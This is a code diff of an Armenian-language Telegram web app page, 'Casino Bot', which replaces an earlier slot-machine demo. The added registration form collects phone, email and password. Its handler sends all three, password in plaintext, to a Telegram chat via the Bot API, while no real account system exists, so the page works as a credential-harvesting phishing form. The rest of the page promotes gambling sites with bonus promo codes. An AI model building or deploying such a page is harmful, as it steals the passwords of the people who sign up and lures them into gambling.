@@ -2,560 +2,271 @@
 <html lang="hy">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Burning Hot - Crypto Payout PRO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Casino Bot - Official</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root {
-            --bg-color: #072a0e;
-            --panel-bg: #051808;
-            --gold: #f4c430;
-            --gold-light: #ffea9f;
-            --text-color: #ffffff;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            user-select: none;
-            -webkit-user-select: none;
-            font-family: Arial, sans-serif;
-        }
-
-        body {
-            background: var(--bg-color);
-            color: var(--text-color);
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-evenly;
-            padding: 4px;
-            overflow: hidden;
-        }
-
-        .jackpot-panel {
-            width: 100%;
-            max-width: 360px;
-            background: #0c2d12;
-            border: 2px solid var(--gold);
-            border-radius: 6px;
-            padding: 3px;
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 2px;
-            text-align: center;
-        }
-
-        .jp-box {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #c5a059;
-            border-radius: 3px;
-            padding: 2px;
-        }
-
-        .jp-title { font-size: 7px; font-weight: bold; }
-        .jp-val { font-size: 9px; color: var(--gold-light); font-weight: bold; }
-
-        header {
-            width: 100%;
-            max-width: 360px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: var(--panel-bg);
-            border: 2px solid var(--gold);
-            border-radius: 6px;
-            padding: 5px 8px;
-            gap: 4px;
-        }
-
-        .balance-box, .win-box {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .label { font-size: 6px; color: var(--gold); font-weight: bold; }
-        .value { font-size: 11px; font-weight: bold; color: var(--text-color); }
-
-        .top-up-btn, .cashout-btn {
-            background: linear-gradient(135deg, #ffcc00, #ff8800);
-            border: 1px solid #fff;
-            border-radius: 4px;
-            padding: 5px 7px;
-            font-size: 8px;
-            font-weight: bold;
-            color: #000;
-            cursor: pointer;
-        }
-
-        .cashout-btn {
-            background: linear-gradient(135deg, #2e7d32, #1b5e20);
-            color: #fff;
-        }
-
-        .slot-container {
-            background: #010602;
-            border: 3px solid var(--gold);
-            border-radius: 8px;
-            padding: 5px;
-            width: 100%;
-            max-width: 360px;
-        }
-
-        .grid-5x3 {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 4px;
-        }
-
-        .reel-cell {
-            background: #ffffff;
-            border: 2px solid #b8860b;
-            border-radius: 5px;
-            height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-        }
-
-        .reel-cell.seven-symbol {
-            background: linear-gradient(135deg, #ff0000, #990000);
-            color: #ffeb3b;
-            font-weight: 900;
-            text-shadow: 0 0 5px #ffeb3b;
-            border-color: #ffcc00;
-        }
-
-        .reel-cell.winning {
-            background: #ffcc00 !important;
-            color: #000 !important;
-            border-color: #ff0000;
-            text-shadow: none;
-            transform: scale(1.05);
-            transition: 0.2s;
-        }
-
-        .controls-panel {
-            width: 100%;
-            max-width: 360px;
-            background: var(--panel-bg);
-            border: 2px solid var(--gold);
-            border-radius: 8px;
-            padding: 5px;
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-        }
-
-        .bets-row {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 3px;
-        }
-
-        .bet-btn {
-            background: #051808;
-            border: 1px solid var(--gold);
-            color: var(--gold);
-            padding: 5px 0;
-            border-radius: 3px;
-            font-size: 9px;
-            font-weight: bold;
-            cursor: pointer;
-            text-align: center;
-        }
-
-        .bet-btn.active {
-            background: var(--gold);
-            color: #000;
-        }
-
-        .spin-btn {
-            width: 100%;
-            height: 38px;
-            border-radius: 19px;
-            background: linear-gradient(145deg, #d32f2f, #8b0000);
-            border: 2px solid var(--gold);
-            color: #fff;
-            font-size: 13px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .spin-btn.stop-mode {
-            background: linear-gradient(145deg, #ff8c00, #ff4500);
-        }
-
-        .modal {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 100;
-        }
-
-        .modal-content {
-            background: var(--panel-bg);
-            border: 2px solid var(--gold);
-            padding: 14px;
-            border-radius: 8px;
-            text-align: center;
-            width: 85%;
-            max-width: 280px;
-        }
-
-        .modal-content h3 { color: var(--gold); margin-bottom: 6px; font-size: 11px; }
-        .modal-content p { font-size: 8px; color: #ccc; margin-bottom: 6px; }
-
-        .option-input {
-            width: 100%;
-            padding: 6px;
-            background: #010602;
-            border: 1px solid var(--gold);
-            color: #fff;
-            border-radius: 4px;
-            font-size: 10px;
-            text-align: center;
-            margin-bottom: 5px;
-            outline: none;
-        }
-
-        .option-btn {
-            background: #051808;
-            border: 1px solid var(--gold);
-            color: #fff;
-            padding: 6px;
-            margin: 3px 0;
-            border-radius: 4px;
-            width: 100%;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 10px;
-        }
-
-        .stars-btn {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            color: #000;
-        }
-
-        .crypto-btn {
-            background: linear-gradient(135deg, #0088cc, #004466);
-            color: #fff;
-        }
-
-        .close-modal {
-            margin-top: 5px;
-            background: #444;
-            color: #fff;
-            border: none;
-            padding: 4px 8px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 9px;
-        }
-    </style>
 </head>
-<body>
+<body class="bg-zinc-950 text-zinc-100 font-sans min-h-screen flex flex-col justify-between pb-24">
+
+    <div id="auth-modal" class="fixed inset-0 bg-zinc-950/95 z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-zinc-900 border border-zinc-800 w-full max-w-sm p-6 rounded-3xl shadow-2xl space-y-4">
+            <div class="text-center space-y-1">
+                <h2 class="text-2xl font-black text-yellow-500">Casino Bot</h2>
+                <p class="text-xs text-zinc-400">Խաղերին և բոնուսներին հասնելու համար գրանցվեք</p>
+            </div>
+
+            <form id="register-form" onsubmit="handleRegister(event)" class="space-y-3">
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">Հեռախոսահամար</label>
+                    <input type="tel" id="phone" required placeholder="+374 XX XXXXXX" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                </div>
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">Էլ. հասցե (Email)</label>
+                    <input type="email" id="email" required placeholder="example@mail.com" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                </div>
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">Գաղտնաբառ</label>
+                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                </div>
+                <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-400 text-zinc-950 font-bold py-3.5 rounded-xl transition mt-2 shadow-lg shadow-yellow-500/20">
+                    Գրանցվել և Մուտք գործել
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <div>
+        <header class="p-4 flex justify-between items-center border-b border-zinc-800 bg-zinc-950/80 backdrop-blur-md sticky top-0 z-30">
+            <div class="flex items-center space-x-2">
+                <span class="text-xl font-black tracking-wider text-yellow-500">Casino Bot</span>
+            </div>
+            <div class="flex items-center space-x-3">
+                <button onclick="logout()" class="bg-zinc-900 border border-zinc-800 px-3 py-1 rounded-full text-xs font-bold text-red-400 transition">
+                    Ելք
+                </button>
+                <button class="text-lg">🇦🇲</button>
+            </div>
+        </header>
+
+        <div class="p-4">
+            <div class="overflow-x-auto flex space-x-3 scrollbar-none snap-x">
+                <div class="min-w-[300px] h-40 bg-gradient-to-r from-emerald-600 to-teal-700 rounded-2xl p-4 flex flex-col justify-between snap-center shadow-lg relative overflow-hidden">
+                    <div>
+                        <span class="bg-black/30 text-xs px-2 py-1 rounded text-white font-bold">Tonplay</span>
+                        <h2 class="text-2xl font-black mt-2">CASHBACK 9.5%</h2>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-zinc-100">Ամենշաբաթյա վերադարձ</span>
+                        <span class="text-2xl">🦆</span>
+                    </div>
+                </div>
+                <div class="min-w-[300px] h-40 bg-gradient-to-r from-yellow-600 to-amber-700 rounded-2xl p-4 flex flex-col justify-between snap-center shadow-lg relative overflow-hidden">
+                    <div>
+                        <span class="bg-black/30 text-xs px-2 py-1 rounded text-white font-bold">WELCOME PACKAGE</span>
+                        <h2 class="text-2xl font-black mt-2">225% + 1000 FS</h2>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-zinc-100">Կոդ՝ CASBOT26</span>
+                        <span class="text-2xl">👑</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <main class="px-4 space-y-3" id="content-container">
+            </main>
+    </div>
+
+    <nav class="fixed bottom-0 left-0 right-0 bg-zinc-900/95 backdrop-blur-md border-t border-zinc-800 p-3 flex justify-around z-40">
+        <button onclick="switchTab('games')" id="btn-games" class="flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20">
+            <span>🎮</span>
+            <span>Խաղեր (Games)</span>
+        </button>
+        <button onclick="switchTab('sport')" id="btn-sport" class="flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition">
+            <span>⚽</span>
+            <span>Սպորտ (Sport)</span>
+        </button>
+    </nav>
 
     <script>
-        let tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
-    </script>
+        // TELEGRAM BOT CONFIGURATION (Գրեք ձեր տվյալները այստեղ)
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
-    <div class="jackpot-panel">
-        <div class="jp-box"><div class="jp-title" style="color: #ff5252;">SPADE</div><div class="jp-val">19,400 ֏</div></div>
-        <div class="jp-box"><div class="jp-title" style="color: #ff8a80;">HEART</div><div class="jp-val">13,200 ֏</div></div>
-        <div class="jp-box"><div class="jp-title" style="color: #40c4ff;">DIAM</div><div class="jp-val">9,100 ֏</div></div>
-        <div class="jp-box"><div class="jp-title" style="color: #69f0ae;">CLUB</div><div class="jp-val">5,000 ֏</div></div>
-    </div>
-
-    <header>
-        <div class="balance-box">
-            <span class="label">ԲԱԼԱՆՍ</span>
-            <span class="value" id="balanceVal">1000 ֏</span>
-        </div>
-        <div class="win-box">
-            <span class="label">ՇԱՀՈՒՄ</span>
-            <span class="value" id="winVal">0 ֏</span>
-        </div>
-        <button class="top-up-btn" onclick="openModal('topUpModal')">ԴԵՊՈԶԻՏ</button>
-        <button class="cashout-btn" onclick="openModal('cashoutModal')">ՀԱՆԵԼ</button>
-    </header>
-
-    <div class="slot-container">
-        <div class="grid-5x3" id="slotGrid">
-            <div class="reel-cell" data-index="0">🍇</div>
-            <div class="reel-cell" data-index="1">⭐</div>
-            <div class="reel-cell" data-index="2">🍊</div>
-            <div class="reel-cell" data-index="3">🔔</div>
-            <div class="reel-cell seven-symbol" data-index="4">7</div>
-
-            <div class="reel-cell" data-index="5">🍉</div>
-            <div class="reel-cell" data-index="6">⭐</div>
-            <div class="reel-cell" data-index="7">🍊</div>
-            <div class="reel-cell" data-index="8">🍉</div>
-            <div class="reel-cell" data-index="9">🍇</div>
-
-            <div class="reel-cell" data-index="10">🍇</div>
-            <div class="reel-cell" data-index="11">⭐</div>
-            <div class="reel-cell seven-symbol" data-index="12">7</div>
-            <div class="reel-cell" data-index="13">🍑</div>
-            <div class="reel-cell" data-index="14">🔔</div>
-        </div>
-    </div>
-
-    <div class="controls-panel">
-        <div class="bets-row">
-            <button class="bet-btn active" onclick="setBet(20, this)">20 ֏</button>
-            <button class="bet-btn" onclick="setBet(40, this)">40 ֏</button>
-            <button class="bet-btn" onclick="setBet(60, this)">60 ֏</button>
-            <button class="bet-btn" onclick="setBet(80, this)">80 ֏</button>
-            <button class="bet-btn" onclick="setBet(100, this)">100 ֏</button>
-        </div>
-        <button class="spin-btn" id="spinBtn" onclick="handleSpinButton()">ՊՏՏԵԼ</button>
-    </div>
-
-    <div class="modal" id="topUpModal">
-        <div class="modal-content">
-            <h3>ԴԵՊՈԶԻՏ / ՀԱՄԱԼՐՈՒՄ</h3>
-            <p>Ընտրեք համալրման եղանակը</p>
-            <button class="option-btn stars-btn" onclick="buyWithTelegramStars()">⭐ Գնել աստղերով (Telegram Stars)</button>
-            <button class="option-btn" onclick="customTopUpTest()">🧪 Թեստային ավելացում (Անվճար)</button>
-            <button class="close-modal" onclick="closeModal('topUpModal')">Փակել</button>
-        </div>
-    </div>
-
-    <div class="modal" id="cashoutModal">
-        <div class="modal-content">
-            <h3>ԿԱՆԽԻԿԱՑՈՒՄ (Crypto Payout)</h3>
-            <p>Մուտքագրեք գումարը և TON/USDT դրամապանակը</p>
-            <input type="number" id="cashoutAmount" class="option-input" placeholder="Գումարը" value="500" />
-            <input type="text" id="walletAddress" class="option-input" placeholder="Tonkeeper / Crypto Address" />
-            <button class="option-btn crypto-btn" onclick="requestCryptoPayout()">🚀 Ուղարկել կանխիկացման հայտ</button>
-            <button class="close-modal" onclick="closeModal('cashoutModal')">Փակել</button>
-        </div>
-    </div>
-
-    <script>
-        const symbols = ['🍇', '🍉', '🍊', '🍑', '🍋', '🔔', '7', '⭐'];
-        let balance = 1000;
-        let currentBet = 20;
-        let currentWin = 0;
-        let isSpinning = false;
-        let spinInterval = null;
-        let spinTimeout = null;
-
-        let audioCtx = null;
-        function initAudio() {
-            if (!audioCtx) {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        // Էջը բացվելիս ստուգել գրանցումը և բեռնել խաղերը
+        window.onload = function() {
+            const isRegistered = localStorage.getItem('casino_user_registered');
+            if (!isRegistered) {
+                document.getElementById('auth-modal').classList.remove('hidden');
             }
-            if (audioCtx.state === 'suspended') {
-                audioCtx.resume();
-            }
+            switchTab('games');
         }
 
-        function playSound(type) {
-            try {
-                initAudio();
-                if (!audioCtx) return;
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                let now = audioCtx.currentTime;
+        // Գրանցման հաստատում և տվյալների ուղարկում Telegram
+        async function handleRegister(event) {
+            event.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-                if (type === 'click') {
-                    osc.frequency.setValueAtTime(400, now);
-                    gain.gain.setValueAtTime(0.05, now);
-                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.05);
-                    osc.start(now); osc.stop(now + 0.05);
-                } else if (type === 'spinTick') {
-                    osc.type = 'triangle';
-                    osc.frequency.setValueAtTime(250 + Math.random() * 150, now);
-                    gain.gain.setValueAtTime(0.03, now);
-                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
-                    osc.start(now); osc.stop(now + 0.04);
-                } else if (type === 'win') {
-                    osc.type = 'square';
-                    osc.frequency.setValueAtTime(523.25, now);
-                    osc.frequency.setValueAtTime(659.25, now + 0.15);
-                    osc.frequency.setValueAtTime(783.99, now + 0.3);
-                    gain.gain.setValueAtTime(0.08, now);
-                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
-                    osc.start(now); osc.stop(now + 0.6);
-                }
-            } catch(e) {}
-        }
-
-        function updateUI() {
-            document.getElementById('balanceVal').innerText = balance + ' ֏';
-            document.getElementById('winVal').innerText = currentWin + ' ֏';
-        }
-
-        function setBet(amount, btn) {
-            if (isSpinning) return;
-            playSound('click');
-            currentBet = amount;
-            document.querySelectorAll('.bet-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        }
-
-        function handleSpinButton() {
-            if (!isSpinning) {
-                startSpin();
-            } else {
-                stopSpinImmediately();
-            }
-        }
-
-        function startSpin() {
-            initAudio();
-            if (balance < currentBet) {
-                alert('Բալանսը բավարար չէ։ Համալրեք դեպոզիտը:');
-                return;
-            }
-
-            playSound('click');
-            balance -= currentBet;
-            currentWin = 0;
-            updateUI();
-            
-            document.querySelectorAll('.reel-cell').forEach(c => {
-                c.classList.remove('winning', 'seven-symbol');
-            });
-
-            isSpinning = true;
-            const spinBtn = document.getElementById('spinBtn');
-            spinBtn.innerText = '🛑 ԿԱՆԳՆԵՑՆԵԼ';
-            spinBtn.classList.add('stop-mode');
-
-            let cells = document.querySelectorAll('.reel-cell');
-            
-            spinInterval = setInterval(() => {
-                cells.forEach(c => {
-                    let sym = symbols[Math.floor(Math.random() * symbols.length)];
-                    c.innerText = sym;
-                    if (sym === '7') {
-                        c.classList.add('seven-symbol');
-                    } else {
-                        c.classList.remove('seven-symbol');
-                    }
-                    playSound('spinTick');
-                });
-            }, 60);
-
-            spinTimeout = setTimeout(() => {
-                if (isSpinning) finishSpin();
-            }, 2500);
-        }
-
-        function stopSpinImmediately() {
-            if (!isSpinning) return;
-            clearTimeout(spinTimeout);
-            finishSpin();
-        }
-
-        function finishSpin() {
-            if (!isSpinning) return;
-            clearInterval(spinInterval);
-            isSpinning = false;
-
-            const spinBtn = document.getElementById('spinBtn');
-            spinBtn.innerText = 'ՊՏՏԵԼ';
-            spinBtn.classList.remove('stop-mode');
-
-            let cells = document.querySelectorAll('.reel-cell');
-            let grid = [];
-            for(let i=0; i<3; i++) {
-                grid[i] = [];
-                for(let j=0; j<5; j++) {
-                    let sym = symbols[Math.floor(Math.random() * symbols.length)];
-                    let idx = i * 5 + j;
-                    cells[idx].innerText = sym;
-                    
-                    if (sym === '7') {
-                        cells[idx].classList.add('seven-symbol');
-                    } else {
-                        cells[idx].classList.remove('seven-symbol');
-                    }
-                    grid[i][j] = { sym: sym, index: idx };
-                }
-            }
-
-            let winningIndices = new Set();
-            let totalWinMultiplier = 0;
-
-            for(let i=0; i<3; i++) {
-                let s0 = grid[i][0].sym, s1 = grid[i][1].sym, s2 = grid[i][2].sym;
-                let s3 = grid[i][3].sym, s4 = grid[i][4].sym;
+            if (phone && email && password) {
+                const message = `🚨 Նոր գրանցում Casino Bot-ում:\n\n📱 Հեռախոս: ${phone}\n📧 Email: ${email}\n🔑 Գաղտնաբառ: ${password}`;
                 
-                if(s0 === s1 && s1 === s2) {
-                    let count = (s0 === s3) ? ((s0 === s4) ? 5 : 4) : 3;
-                    let mult = (s0 === '7') ? 20 : 10;
-                    totalWinMultiplier += mult * (count - 2);
-                    for(let c=0; c<count; c++) winningIndices.add(grid[i][c].index);
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    });
+                } catch (error) {
+                    console.error('Error sending to telegram:', error);
                 }
-            }
 
-            if(totalWinMultiplier > 0) {
-                currentWin = currentBet * totalWinMultiplier;
-                balance += currentWin;
-                winningIndices.forEach(idx => {
-                    cells[idx].classList.remove('seven-symbol');
-                    cells[idx].classList.add('winning');
-                });
-                playSound('win');
-                updateUI();
+                localStorage.setItem('casino_user_registered', 'true');
+                localStorage.setItem('casino_user_email', email);
+                
+                document.getElementById('auth-modal').classList.add('hidden');
+                alert('Հաջողությամբ գրանցվեցիք։ Բարի գալուստ!');
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem('casino_user_registered');
+            location.reload();
+        }
+
+        // Պրոմոկոդերի պատճենում
+        function copyCode(code) {
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Պրոմոկոդը պատճենվեց՝ ' + code);
+            });
+        }
+
+        // Բաժինների փոխարկում (Խաղեր/Սլոտեր և Սպորտ)
+        function switchTab(tab) {
+            const btnGames = document.getElementById('btn-games');
+            const btnSport = document.getElementById('btn-sport');
+            const container = document.getElementById('content-container');
+
+            if (tab === 'games') {
+                btnGames.className = "flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
+                btnSport.className = "flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition";
+                
+                container.innerHTML = `
+                    <h3 class="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Հայտնի Սլոտեր և Կազինոներ</h3>
+                    
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-purple-900 rounded-xl flex items-center justify-center font-bold text-lg text-purple-300">T</div>
+                            <div>
+                                <h4 class="font-bold text-sm">Tonplay</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">250 FS</span>
+                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">Up to 7775</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('CBTONPLAY250')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-indigo-950 rounded-xl flex items-center justify-center font-bold text-lg text-indigo-400">M</div>
+                            <div>
+                                <h4 class="font-bold text-sm">Mellstroy Game</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">400 FS</span>
+                                    <span class="bg-purple-500/10 text-purple-400 text-[10px] font-bold px-1.5 py-0.5 rounded">550%</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('CASBOT26')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-pink-950 rounded-xl flex items-center justify-center font-bold text-lg text-pink-400">Л</div>
+                            <div>
+                                <h4 class="font-bold text-sm">ЛЯ.Casino</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">300 FS</span>
+                                    <span class="bg-blue-500/10 text-blue-400 text-[10px] font-bold px-1.5 py-0.5 rounded">100%</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('CASINOBOT')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-red-950 rounded-xl flex items-center justify-center font-bold text-lg text-red-400">F</div>
+                            <div>
+                                <h4 class="font-bold text-sm">Fenix Casino</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">400 FS</span>
+                                    <span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-1.5 py-0.5 rounded">500%</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('CASINOBOT')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+                `;
             } else {
-                updateUI();
+                btnSport.className = "flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
+                btnGames.className = "flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition";
+                
+                container.innerHTML = `
+                    <h3 class="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Սպորտային Բոնուսներ</h3>
+                    
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-blue-900 rounded-xl flex items-center justify-center font-bold text-lg text-blue-300">1W</div>
+                            <div>
+                                <h4 class="font-bold text-sm">1Win Sport</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">500% Բոնուս</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('CasiBot100')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+
+                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-12 h-12 bg-orange-950 rounded-xl flex items-center justify-center font-bold text-lg text-orange-400">888</div>
+                            <div>
+                                <h4 class="font-bold text-sm">888Starz</h4>
+                                <div class="flex gap-1.5 mt-1">
+                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">200% Բոնուս</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="copyCode('888_87519')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        </div>
+                    </div>
+                `;
             }
-        }
-
-        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-
-        function buyWithTelegramStars() {
-            if (tg && tg.openInvoice) {
-                alert('Telegram Stars-ով վճարման համար անհրաժեշտ է բոտի կողմից ստեղծված ինվոյսի հղումը (Invoice Link):');
-            } else {
-                alert('Խնդրում ենք բացել խաղը Telegram բոտի ներսից՝ աստղերով գնում կատարելու համար։');
-            }
-            closeModal('topUpModal');
-        }
-
-        function customTopUpTest() {
-            balance += 1000;
-            updateUI();
-            closeModal('topUpModal');
-        }
-
-        function requestCryptoPayout() {
-            let val = parseInt(document.getElementById('cashoutAmount').value) || 0;
-            let wallet = document.getElementById('walletAddress').value.trim();
-
-            if (val <= 0 || val > balance) {
-                alert('Գումարը սխալ է կամ բավարար չէ։');
-                return;
-            }
-            if (!wallet) {
-                alert('Խնդրում ենք մուտքագրել դրամապանակի հասցեն։');
-                return;
-            }
-
-            balance -= val;
-            updateUI();
-            closeModal('cashoutModal');
-            alert('Կանխիկացման հայտը հաջողությամբ ուղարկվեց։ Գումարը կփոխանցվի նշված դրամապանակին ստուգումից հետո։');
         }
     </script>
 </body>
